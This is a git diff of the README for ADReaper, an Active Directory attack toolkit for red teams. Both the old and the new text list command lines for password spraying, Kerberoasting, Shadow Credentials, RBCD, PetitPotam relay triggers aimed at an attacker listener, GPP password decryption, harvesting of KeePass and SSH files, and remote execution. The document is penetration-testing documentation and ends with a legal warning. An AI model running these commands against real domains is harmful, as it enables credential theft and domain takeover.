@@ -1,4 +1,4 @@
-# 💀 ADREAPER: The Definitive Active Directory Attack & Recon Manual ⚔️
+# ⚔️ ADREAPER: Advanced Active Directory Exploitation Framework 🛡️
 
 ```text
  █████╗ ██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
@@ -7,299 +7,148 @@
 ██╔══██║██║  ██║██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
 ██║  ██║██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
 ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
-                                              @adreaper v3.2.0
+                                              @adreaper v3.5.0
 ```
 
-**ADReaper** is a professional-grade, multi-threaded Active Directory reconnaissance and exploitation toolkit. This manual provides an exhaustive reference for every command, flag, and tactical capability within the engine.
+**ADReaper** is a high-performance, expert-tier reconnaissance and offensive security framework designed for stealthy and efficient Active Directory engagements. Engineered for portability and protocol fidelity, it provides Red Teams with the precision tools required to escalate from unauthenticated discovery to full domain compromise.
 
 ---
 
-## 📑 Table of Contents
-1. [Global Configuration](#-global-configuration)
-2. [Phase 1: Infrastructure Discovery (INFRA)](#-phase-1-infrastructure-discovery-infra)
-3. [Phase 2: Object & Policy Enumeration (ENUM)](#-phase-2-object--policy-enumeration-enum)
-4. [Phase 3: Tactical Exploitation (ATTACK)](#-phase-3-tactical-exploitation-attack)
-5. [Phase 4: BloodHound Graph Analysis](#-phase-4-bloodhound-graph-analysis)
-6. [Phase 5: Authentic Remote Execution (EXEC)](#-phase-5-authentic-remote-execution-exec)
-7. [Phase 6: Advanced Autopilot & CVE Modules](#-phase-6-advanced-autopilot--cve-modules)
-8. [Reporting & Workspace Intelligence](#-reporting--workspace-intelligence)
+## 📑 Strategic Operational Phases
+
+1.  **[Infrastructure Reconnaissance](#-infrastructure-reconnaissance)**: Protocol-level service discovery and deep host fingerprinting.
+2.  **[Identity Intelligence](#-identity-intelligence)**: Advanced LDAP enumeration and tactical object analysis.
+3.  **[Tactical Exploitation](#-tactical-exploitation)**: Modern AD attack vectors (Shadow Credentials, RBCD, Relay Triggers).
+4.  **[Graph Ingestion](#-graph-ingestion)**: Direct telemetry pipe for BloodHound/Neo4j analysis.
+5.  **[Intelligence Reporting](#-intelligence-reporting)**: Unified workspace management and interactive mission dashboards.
 
 ---
 
-## ⚙️ Global Configuration
+## ⚙️ Core Configuration (Persistent Flags)
 
-These flags are persistent across all modules except where specified.
-
-| Flag | Shorthand | Description | Default |
+| Flag | Shorthand | Description | Security Context |
 | :--- | :--- | :--- | :--- |
-| `--domain` | `-d` | Target AD Domain (e.g. lab.local) | Required |
-| `--username` | `-u` | Authentication Username | Guest/None |
-| `--password` | `-p` | Authentication Password | None |
-| `--dc-ip` | | IP address of the Domain Controller | Auto-detect |
-| `--hash` | | NTLM Hash (LM:NT) for Pass-the-Hash | None |
-| `--output` | `-o` | Base directory for evidence & reports | `./workspace` |
-| `--verbose` | `-v` | Enable high-verbosity debug logging | `false` |
-| `--json` | | Export results directly to JSON | `false` |
-| `--ldaps` | | Use LDAP over SSL (Port 636) | `false` |
+| `--domain` | `-d` | Target AD Domain (FQDN) | Required for all modules |
+| `--dc-ip` | | Domain Controller IP Address | Primary target for reconnaissance |
+| `--username` | `-u` | Authentication Principal | Supports UPN or SAM formats |
+| `--password` | `-p` | Authentication Secret | Cleartext credential |
+| `--hash` | | NTLM Hash (LM:NT) | Enables standard Pass-the-Hash |
+| `--output` | `-o` | Workspace Root | Defaults to `./workspace` |
+| `--verbose` | `-v` | Debug Verbosity | Intense protocol-level logging |
 
 ---
 
-## 🔍 Phase 1: Infrastructure Discovery (INFRA)
+## 🔍 Infrastructure Reconnaissance
 
-The infrastructure module is designed for the initial entry phase of an engagement.
+### `infra scan` — Advanced Service Discovery
+Optimized multi-threaded TCP scanner with heuristic OS detection and service banner analysis.
 
-### `infra scan` - Port Scanning & Service Fingerprinting
 ```powershell
-# Standard scan against a DC
-.\adreaper.exe infra scan -t 192.168.3.10
+# High-precision scan against core AD services
+.\adreaper.exe infra scan -t 10.10.1.5 --ports 88,135,389,445,636,3389
 
-# All-ports scan with aggressive fingerprinting (Nmap-style)
-.\adreaper.exe infra scan -t 192.168.3.10 --ports all -A
+# Aggressive Nmap-style recon (Full fingerprinting + No-Ping)
+.\adreaper.exe infra scan -t 10.10.1.5 -Pn -A --ports all
 
-# Fast scan of specific ports (SMB, LDAP, Kerberos, RDP)
-.\adreaper.exe infra scan -t 192.168.3.10 --ports 445,389,88,3389
-
-# Stealth Mode: No-ping host discovery
-.\adreaper.exe infra scan -t 192.168.3.10 -Pn
-
-# Save results to a text-based report
-.\adreaper.exe infra scan -t 192.168.3.10 --save results.txt
+# Stealthy banner extraction and export
+.\adreaper.exe infra scan -t 10.10.1.10 --save infra_summary.txt
 ```
 
-### `infra dns` - Service Record Discovery
-```powershell
-# Auto-discover all LDAP, Kerberos, and GC servers via SRV records
-.\adreaper.exe infra dns -d lab.local
+### `infra dns` — DC Locator
+Discover internal AD infrastructure through service location (SRV) records.
 
-# Verbose DNS enumeration across subdomains
-.\adreaper.exe infra dns -d lab.local -v
+```powershell
+# Identify DCs, Global Catalogs, and KDCs
+.\adreaper.exe infra dns -d corp.local
 ```
 
 ---
 
-## 👤 Phase 2: Object & Policy Enumeration (ENUM)
+## 👤 Identity Intelligence
 
-Deep-dive into the Active Directory database.
+### `enum users` — Targeted Identity Extraction
+Advanced filtering to identify low-hanging fruit and high-value targets.
 
-### `enum users` - Identity Recon
 ```powershell
-# List ALL domain users with basic attributes
-.\adreaper.exe enum users -d lab.local -u user -p pass
+# Strategic Hunt: Find Kerberoastable (SPN) & AS-REP Roastable accounts
+.\adreaper.exe enum users -d corp.local --spn-only --asrep-only
 
-# Target: Find Kerberoastable accounts (SPN set)
-.\adreaper.exe enum users -d lab.local --spn-only
-
-# Target: Find AS-REP Roastable accounts (No Pre-Auth)
-.\adreaper.exe enum users -d lab.local --asrep-only
-
-# Target: Find High-Value accounts (AdminCount=1)
-.\adreaper.exe enum users -d lab.local --admin-only
-
-# Target: Find Delegation misconfigurations (Unconstrained/Constrained)
-.\adreaper.exe enum users -d lab.local --deleg
+# Privilege Hunt: Identify accounts with AdminCount=1 or Delegation configured
+.\adreaper.exe enum users --admin-only --deleg
 ```
 
-### `enum domain` - Policy & Forest Recon
-```powershell
-# Extract Domain Functional Level, Password Policy, and Lockout Threshold
-.\adreaper.exe enum domain -d lab.local --dc-ip 192.168.3.10
+### `enum tree` — Visual Share Cartography
+Recursive, visual mapping of remote file systems via SMB.
 
-# Analyze ms-DS-MachineAccountQuota for NoPac/Relay attacks
-.\adreaper.exe enum domain -d lab.local -v
+```powershell
+# Map the entire accessible SMB surface (All Shares)
+.\adreaper.exe enum tree -s all --depth 2 -d corp.local
+
+# Visual explorer for specific high-value shares
+.\adreaper.exe enum tree -s "C$" --path "Users/Public" -d corp.local
 ```
 
-### `enum computers` - Network Inventory
-```powershell
-# List all computer accounts and their OS versions
-.\adreaper.exe enum computers -d lab.local -u user -p pass
+### `enum adcs` — PKI Misconfiguration Analysis
+Enumerates Certificate Authorities and templates to flag ESC1-ESC8 vulnerabilities.
 
-# Identify Domain Controllers and LAPS-enabled machines
-.\adreaper.exe enum computers -d lab.local --verbose
+---
+
+## ⚔️ Tactical Exploitation
+
+### `attack shadow` — Shadow Credentials
+The modern way to take over computer accounts without needing tickets or hashes.
+
+```powershell
+# Domain Controller/Server Takeover (Requires WriteProperty over target)
+.\adreaper.exe attack shadow -t DC01 -d corp.local
 ```
 
-### `enum groups` - Privilege Mapping
-```powershell
-# List all groups and count their members
-.\adreaper.exe enum groups -d lab.local
+### `attack rbcd` — Resource-Based Constrained Delegation
+Orchestrates the modification of `msDS-AllowedToActOnBehalfOfOtherIdentity` for impersonation.
 
-# Search for specific group members (e.g. Domain Admins)
-.\adreaper.exe enum groups --name "Domain Admins" -d lab.local
+```powershell
+# Configure impersonation: Allow ATTACKER$ to act as DA on the target
+.\adreaper.exe attack rbcd -t FILE-SRV -M ATTACKER$
 ```
 
-### `enum tree` - SMB Filesystem Exploration
+### `attack relay` — Forced Authentication Triggers
+Weaponized PetitPotam and PrinterBug implementations for NTLM relaying.
+
 ```powershell
-# List all shares on the target
-.\adreaper.exe enum shares -t DC01 -d lab.local
-
-# Map a visual tree of the 'SYSVOL' share
-.\adreaper.exe enum tree -s "SYSVOL" -d lab.local -u user -p pass
-
-# Map a visual tree of 'C$' with depth limit
-.\adreaper.exe enum tree -s "C$" --depth 2 -d lab.local
-
-# Map the entire host (Global view)
-.\adreaper.exe enum tree -d lab.local -u user -p pass
+# Force machine authentication to your listener
+.\adreaper.exe attack relay -t DC01 -m petitpotam --listener 10.10.10.5
 ```
 
-### `enum adcs` - Certificate Services (PKI)
+### `attack harvest` — Precision Loot Collection
+Automated search and extraction of sensitive files (KeePass, SSH keys, Configs).
+
 ```powershell
-# Discover CAs and vulnerable Certificate Templates (ESC1-ESC4)
-.\adreaper.exe enum adcs -d lab.local -u user -p pass
+# Global loot hunt across all shares
+.\adreaper.exe attack harvest -e kdbx,ssh,conf,xlsx,pdf -d corp.local
 ```
 
 ---
 
-## ⚔️ Phase 3: Tactical Exploitation (ATTACK)
+## 📊 Intelligence Reporting
 
-The weaponized modules of ADReaper.
+ADReaper centralizes mission evidence into an interactive **Intelligence Dashboard**.
 
-### `attack spray` - Authenticated Password Spraying
-```powershell
-# Spray a single password against all domain users with a 5s delay
-.\adreaper.exe attack spray -P "Winter2024!" -d lab.local --delay 5
-
-# Spray using a custom users file
-.\adreaper.exe attack spray -U users.txt -P "Password123!" -d lab.local
-```
-
-### `attack kerberoast` - TGS Hash Extraction
-```powershell
-# Extract hashes for all Kerberoastable (SPN) accounts
-.\adreaper.exe attack kerberoast -d lab.local -u user -p pass -o hashes.txt
-```
-
-### `attack asreproast` - AS-REP Hash Extraction
-```powershell
-# Extract hashes for accounts without Kerberos Pre-Auth
-.\adreaper.exe attack asreproast -d lab.local -o asrep_hashes.txt
-
-# Target specific users from a file
-.\adreaper.exe attack asreproast -U roast_targets.txt -d lab.local
-```
-
-### `attack shadow` - Shadow Credentials (KeyCredentialLink)
-```powershell
-# Inject KeyCredentialLink for a target computer takeover
-.\adreaper.exe attack shadow -t SQLSERVER01 -u user -p pass -d lab.local
-```
-
-### `attack rbcd` - Resource-Based Constrained Delegation
-```powershell
-# Configure RBCD on SRV01 to allow ATTACK_PC$ to impersonate admins
-.\adreaper.exe attack rbcd -t SRV01 -M ATTACK_PC$ -u user -p pass
-```
-
-### `attack gpp` - Group Policy Preference Decryption
-```powershell
-# Search SYSVOL for Groups.xml and decrypt 'cpassword' attributes
-.\adreaper.exe attack gpp -d lab.local -u user -p pass
-```
-
-### `attack relay` - NTLM Relay Triggers
-```powershell
-# Trigger PetitPotam (MS-EFSR) to force machine authentication
-.\adreaper.exe attack relay -t DC01 -m petitpotam --listener 10.0.0.5
-
-# Trigger PrinterBug (MS-RPRN)
-.\adreaper.exe attack relay -t DC01 -m printerbug --listener 10.0.0.5
-```
-
-### `attack harvest` - Sensitive File Collection
-```powershell
-# Search and download .kdbx and .config files from all shares
-.\adreaper.exe attack harvest -e kdbx,config -d lab.local -u user -p pass
-```
+- **report.html**: A professional, Red Team-ready dashboard featuring a universal JSON explorer.
+- **Unified Discovery**: The dashboard automatically aggregates all `.json` findings within the workspace.
+- **Portability**: The report is a standalone artifact requiring no backend infrastructure.
 
 ---
 
-## 🩸 Phase 4: BloodHound Graph Analysis
+## 🛡️ Operational Excellence
 
-Native collection and ingestion engine.
-
-### `bloodhound collect` - SharpHound Compatibility
-```powershell
-# Full collection of domain objects and ACLs
-.\adreaper.exe bloodhound collect -d lab.local --dc-ip 192.168.3.10 -u user -p pass
-```
-
-### `bloodhound ingest` - Direct Neo4j Pipe
-```powershell
-# Ingest data directly into a local or remote Neo4j instance
-.\adreaper.exe bloodhound ingest --neo4j-uri bolt://127.0.0.1:7687 --neo4j-pass "BloodHound123"
-```
+- **Protocol Purity**: No dependency on `net.exe` or `powershell.exe`. Pure Go implementation of LDAP, SMB, and Kerberos.
+- **Threaded Precision**: Optimized worker pools for massive horizontal reconnaissance.
+- **OPSEC Aware**: Designed to minimize forensic footprint during enumeration.
 
 ---
 
-## 🌌 Phase 5: Authentic Remote Execution (EXEC)
+**Crafted for precision. Optimized for results.** ⚔️🔥🚀
 
-Protocol-level command execution (No simulated output).
-
-### `exec` - PSEXEC-Style Execution
-```powershell
-# Run 'whoami /all' on a remote machine
-.\adreaper.exe "whoami /all" -t 192.168.3.10 -d lab.local -u admin -p pass
-
-# Run a full 'systeminfo' report
-.\adreaper.exe "systeminfo" -t 192.168.3.10 -d lab.local -u admin -p pass
-
-# Check active network connections
-.\adreaper.exe "netstat -ano" -t 192.168.3.10 -u admin -p pass
-```
-
----
-
-## 🤖 Phase 6: Advanced Autopilot & CVE Modules
-
-### `autopilot` - Orchestrated Attacks
-```powershell
-# Run Phase 1 (Initial Recon) automatically
-.\adreaper.exe autopilot --phase 1 -d lab.local
-
-# Run Phase 5 (Full Domination - Kerberoast + GPP + RBCD)
-.\adreaper.exe autopilot --phase 5 -d lab.local -u user -p pass
-```
-
-### `cve` - Exploit Readiness
-```powershell
-# Check for CVE-2021-42278 (NoPac) readiness
-.\adreaper.exe cve nopac -d lab.local
-
-# Check for ZeroLogon (CVE-2020-1472)
-.\adreaper.exe cve zerologon -t DC01
-```
-
----
-
-## 📈 Reporting & Workspace Intelligence
-
-ADReaper manages all evidence in a unified workspace.
-
-### Workspace Directory Structure
-```text
-workspace/
-├── report.html        <-- Premium Interactive Dashboard
-├── artifacts/         <-- Raw JSON/TXT outputs
-├── loot/              <-- Harvested files (.kdbx, .config)
-└── bloodhound/        <-- SharpHound-ready JSONs
-```
-
-### The Premium HTML Dashboard
-To view your mission results:
-1. Open `workspace/report.html` in any browser.
-2. The dashboard automatically discovers all findings in the workspace.
-3. Use the **Universal JSON Viewer** to explore every detail of the enumerated objects.
-
----
-
-## 🧱 Architecture Details
-
-- **Binary Portability**: Written in Go, ADReaper is a single binary that runs on Windows, Linux, and macOS without external dependencies.
-- **Protocol Fidelity**: ADReaper implements the raw SMB2, LDAP, and Kerberos protocols. It does not wrap `net.exe` or `powershell.exe`.
-- **Concurrency Model**: High-performance worker pools for port scanning and file harvesting ensure maximum speed in large environments.
-
----
-
-## 📜 Legal & Ethical Warning
 ADReaper is a powerful security testing tool. It must only be used on systems where you have explicit, written permission from the owner. Unauthorized access to computer systems is illegal and unethical.
 
 ---
